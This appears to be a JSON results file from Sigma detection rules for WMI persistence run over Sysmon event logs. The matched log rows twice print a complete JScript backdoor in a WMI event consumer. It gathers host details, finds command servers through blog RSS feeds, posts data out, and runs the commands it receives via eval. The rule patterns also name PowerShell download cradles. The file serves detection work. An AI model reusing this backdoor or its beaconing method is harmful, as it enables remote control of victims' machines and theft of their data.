[{
  "title": "Suspicious Scripting in a WMI Consumer",
  "id": "fe21810c-2a8c-478f-8dd3-5a287fb2a0e0",
  "description": "Detects suspicious commands that are related to scripting/powershell in WMI Event Consumers",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND ((EventID=19 OR EventID=20 OR EventID=21) AND ((Destination LIKE '%new-object%' ESCAPE '\\' AND Destination LIKE '%net.webclient%' ESCAPE '\\' AND Destination LIKE '%.downloadstring%' ESCAPE '\\') OR (Destination LIKE '%new-object%' ESCAPE '\\' AND Destination LIKE '%net.webclient%' ESCAPE '\\' AND Destination LIKE '%.downloadfile%' ESCAPE '\\') OR (Destination LIKE '% iex(%' ESCAPE '\\' OR Destination LIKE '% -nop %' ESCAPE '\\' OR Destination LIKE '% -noprofile %' ESCAPE '\\' OR Destination LIKE '% -decode %' ESCAPE '\\' OR Destination LIKE '% -enc %' ESCAPE '\\' OR Destination LIKE '%WScript.Shell%' ESCAPE '\\' OR Destination LIKE '%System.Security.Cryptography.FromBase64Transform%' ESCAPE '\\')))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.execution",
    "attack.t1059.005"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "PC04.example.corp",
      "Destination": " \"var sXmlUrl=\\\"http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss\\\";var sOwner='XDD';var MAIN=function(){$=this;$.key='W';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='2.0.0';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\\\\\"%PCI%\\\\\\\" and NetConnectionStatus=2'));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&authname=servername&authpass=serverpass&hostname='+$.sHostName+'&ostype='+$.sOSType+'&macaddr='+$.sMacAddress+'&owner='+$.sOwner+'&version='+$.version+'&runtime='+$.runtime;$.sURLParam+='&t='+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI('Select * from Win32_Process where Name=\\\\\\\"scrcons.exe\\\\\\\"'));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x('Microsoft.XmlHttp');var feedUrlArry=$.sFeedUrl.split(';');var start=new Date();var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');for(var n=0;n<feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match('http://.*?\\\\\\\\.php');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,'');var re=/<title>@(.*)@<\\\\/title>+/g;var titleList=response.match(re);for(var i=0;i<titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName('title');var tmpstr=container[0].text.match('@(.*)@');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex<UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum-->0){$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,'');if(response.length>0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName('div');for(var i=0;i<container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){commands=eval('('+container[i].text+')').command;}}}catch(e){}if(commands!=null){var commandresult='';for(var i=0;i<commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+=',';}commandresult+='\\\\''+commands[i].id+'\\\\':\\\\''+escape(result)+'\\\\'';}if(commandresult.length>0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&command=result&commandresult='+commandresult);}}else{$.sXmlUrl='';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length>0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();\"",
      "EventID": 20,
      "EventRecordID": 7195,
      "EventType": "WmiConsumerEvent",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Name": " \"ProbeScriptFint\"",
      "Opcode": 0,
      "Operation": "Modified",
      "OriginalLogfile": "wmighost_sysmon_20_21_1.evtx",
      "ProcessID": 1828,
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SystemTime": "2019-04-03T18:11:54.178467Z",
      "Task": 20,
      "ThreadID": 3164,
      "Type": "Script",
      "User": "PC04\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-04-03 18:11:54.178",
      "Version": 3
    }
  ]
},
{
  "title": "WMI Persistence - Script Event Consumer",
  "id": "ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e",
  "description": "Detects WMI script event consumers",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (Image LIKE 'C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons.exe' ESCAPE '\\' AND ParentImage LIKE 'C:\\\\Windows\\\\System32\\\\svchost.exe' ESCAPE '\\'))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.persistence",
    "attack.privilege-escalation",
    "attack.t1546.003"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 4,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\Windows\\system32\\wbem\\scrcons.exe -Embedding",
      "Company": "Microsoft Corporation",
      "Computer": "PC04.example.corp",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "WMI Standard Event Consumer - scripting",
      "EventID": 1,
      "EventRecordID": 7203,
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=6AEC20B9D4C1AB6F1AB297F28EB6BF93,IMPHASH=CCEC86CC0D16062391CC627BC9466A62",
      "IMPHASH": "CCEC86CC0D16062391CC627BC9466A62",
      "Image": "C:\\Windows\\System32\\wbem\\scrcons.exe",
      "IntegrityLevel": "System",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "365ABB72-701F-5CA5-0000-0020E7030000",
      "LogonId": "0x3e7",
      "MD5": "6AEC20B9D4C1AB6F1AB297F28EB6BF93",
      "Opcode": 0,
      "OriginalLogfile": "wmighost_sysmon_20_21_1.evtx",
      "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
      "ParentImage": "C:\\Windows\\System32\\svchost.exe",
      "ParentProcessGuid": "365ABB72-7020-5CA5-0000-0010ED6A0000",
      "ParentProcessId": 596,
      "ProcessGuid": "365ABB72-F76F-5CA4-0000-0010AA201700",
      "ProcessID": 1828,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SystemTime": "2019-04-03T18:12:00.016862Z",
      "Task": 1,
      "TerminalSessionId": 0,
      "ThreadID": 372,
      "User": "NT AUTHORITY\\SYSTEM",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-04-03 18:11:59.996",
      "Version": 5
    }
  ]
},
{
  "title": "WMI Event Subscription",
  "id": "0f06a3a5-6a09-413f-8743-e6cf35561297",
  "description": "Detects creation of WMI event subscription persistence method",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND ((EventID=19 OR EventID=20 OR EventID=21) AND (EventID=19 OR EventID=20 OR EventID=21))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.privilege-escalation",
    "attack.persistence",
    "attack.t1546.003"
  ],
  "count": 2,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "PC04.example.corp",
      "Destination": " \"var sXmlUrl=\\\"http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss\\\";var sOwner='XDD';var MAIN=function(){$=this;$.key='W';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='2.0.0';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\\\\\"%PCI%\\\\\\\" and NetConnectionStatus=2'));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&authname=servername&authpass=serverpass&hostname='+$.sHostName+'&ostype='+$.sOSType+'&macaddr='+$.sMacAddress+'&owner='+$.sOwner+'&version='+$.version+'&runtime='+$.runtime;$.sURLParam+='&t='+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI('Select * from Win32_Process where Name=\\\\\\\"scrcons.exe\\\\\\\"'));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x('Microsoft.XmlHttp');var feedUrlArry=$.sFeedUrl.split(';');var start=new Date();var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');for(var n=0;n<feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match('http://.*?\\\\\\\\.php');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,'');var re=/<title>@(.*)@<\\\\/title>+/g;var titleList=response.match(re);for(var i=0;i<titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName('title');var tmpstr=container[0].text.match('@(.*)@');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex<UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum-->0){$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,'');if(response.length>0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName('div');for(var i=0;i<container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){commands=eval('('+container[i].text+')').command;}}}catch(e){}if(commands!=null){var commandresult='';for(var i=0;i<commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+=',';}commandresult+='\\\\''+commands[i].id+'\\\\':\\\\''+escape(result)+'\\\\'';}if(commandresult.length>0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&command=result&commandresult='+commandresult);}}else{$.sXmlUrl='';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length>0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();\"",
      "EventID": 20,
      "EventRecordID": 7195,
      "EventType": "WmiConsumerEvent",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Name": " \"ProbeScriptFint\"",
      "Opcode": 0,
      "Operation": "Modified",
      "OriginalLogfile": "wmighost_sysmon_20_21_1.evtx",
      "ProcessID": 1828,
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SystemTime": "2019-04-03T18:11:54.178467Z",
      "Task": 20,
      "ThreadID": 3164,
      "Type": "Script",
      "User": "PC04\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-04-03 18:11:54.178",
      "Version": 3
    },
    {
      "row_id": 3,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "PC04.example.corp",
      "Consumer": " \"\\\\\\\\.\\\\root\\\\subscription:ActiveScriptEventConsumer.Name=\\\"ProbeScriptFint\\\"\"",
      "EventID": 21,
      "EventRecordID": 7197,
      "EventType": "WmiBindingEvent",
      "Filter": " \"\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\\"ProbeScriptFint\\\"\"",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Opcode": 0,
      "Operation": "Modified",
      "OriginalLogfile": "wmighost_sysmon_20_21_1.evtx",
      "ProcessID": 1828,
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SystemTime": "2019-04-03T18:11:54.198496Z",
      "Task": 21,
      "ThreadID": 3164,
      "User": "PC04\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-04-03 18:11:54.198",
      "Version": 3
    }
  ]
}]